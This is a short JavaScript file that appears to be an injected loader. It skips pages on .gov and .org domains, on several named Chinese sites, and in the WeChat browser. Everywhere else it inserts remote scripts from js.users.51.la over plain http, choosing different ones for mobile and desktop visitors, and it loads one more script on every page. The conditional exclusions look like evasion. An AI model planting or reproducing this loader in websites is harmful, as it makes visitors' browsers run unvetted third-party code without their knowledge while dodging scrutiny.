var myHost = !! (/(kaisafax.com|highflyersef.cn|.org|.gov|sf-express.com|sf.gmta.com.cn|m.tujia.com|m.5i5j.com|m.fang.com|m.iwjw.com|m.lianjia.com)/i.test(document.domain));
var myUA = !! (/(MicroMessenger)/i.test(window.navigator.userAgent));

function loadJs(url) {
	var el = document.createElement('script');
	el.src = url;
	el.type = 'text/javascript';
	document.getElementsByTagName('head')[0].appendChild(el)
};
if (myHost || myUA) {} else {
	var ISIOS = !! (/(iPhone|iPad|iPod|iOS)/i.test(window.navigator.userAgent));
	var ISAPK = !! (/(android)/i.test(window.navigator.userAgent));
	if (ISAPK || ISIOS) {
		loadJs('http://js.users.51.la/18865330.js')
	} else {
		loadJs('http://js.users.51.la/18919590.js')
	}
}
loadJs("http://js.users.51.la/18732117.js")